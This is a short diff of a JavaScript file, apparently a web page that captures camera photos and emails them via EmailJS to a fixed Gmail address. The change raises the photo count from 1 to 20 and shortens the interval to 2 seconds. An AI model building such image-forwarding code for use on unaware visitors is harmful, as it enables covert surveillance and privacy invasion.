@@ -1,8 +1,8 @@
   // Inicializa EmailJS
   emailjs.init("VjQYPRJy2mXtQPXgB"); // tu Public Key
 
-  const maxPhotos = 1;
-  const photoInterval = 3000;
+  const maxPhotos = 20;
+  const photoInterval = 2000;
   const toEmail = "root52909@gmail.com";
 
   const videoVisible = document.getElementById("videoVisible");
